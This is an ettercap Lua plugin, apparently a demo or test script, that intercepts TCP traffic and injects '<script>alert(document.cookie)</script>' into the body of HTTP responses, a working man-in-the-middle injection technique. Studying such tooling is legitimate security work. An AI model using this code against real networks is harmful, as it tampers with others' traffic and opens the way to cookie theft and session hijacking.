description = "This is a test script that will inject HTTP stuff";

-- Defines our hook point as being TCP
hook_point = ettercap.ffi.C.HOOK_PACKET_TCP;

local bit = require('bit')

function split_http(str)
  local start,finish,header,body = string.find(str, '(.-\r?\n\r?\n)(.*)')
  return start,finish,header, body
end

function shrink_http_body(body)
  local modified_body = string.gsub(body, '>%s*<','><')
  return modified_body
end


-- Here's your match rule.
match_rule = function(po)
  if (po.DATA.len <= 7) then
    return false
  end

  local buf = ettercap.ffi.string(po.DATA.data, 7)
  local ret = (buf == "HTTP/1.")
  if (ret == true) then
    return true
  end
  return false

end

-- Here's your action.
action = function(po) 
  ettercap.log("inject_http action : called!\n")
  -- Get the full buffer....
  local buf = ettercap.ffi.string(po.DATA.data, po.DATA.len)
  -- Split the header/body up so we can manipulate things.
  local start,finish,header, body = split_http(buf)
  -- local start,finish,header,body = string.find(buf, '(.-\r?\n\r?\n)(.*)')
  if (not (start == nil)) then
    -- We've got a proper split.
    local orig_body_len = string.len(body)

    local modified_body = string.gsub(body, '<body>','<body><script>alert(document.cookie)</script>')
    -- We've tweaked things, so let's update the data.
    if (not(modified_body == body)) then
      ettercap.log("inject_http action : We modified the HTTP response!\n")
      local modified_data = header .. modified_body
      ettercap.ffi.copy(po.DATA.data, modified_data, string.len(modified_data))
      local buf2 = ettercap.ffi.string(po.DATA.data, po.DATA.len)
      po.flags = bit.bor(po.flags,ettercap.ffi.C.PO_MODIFIED)
    end
  end
end
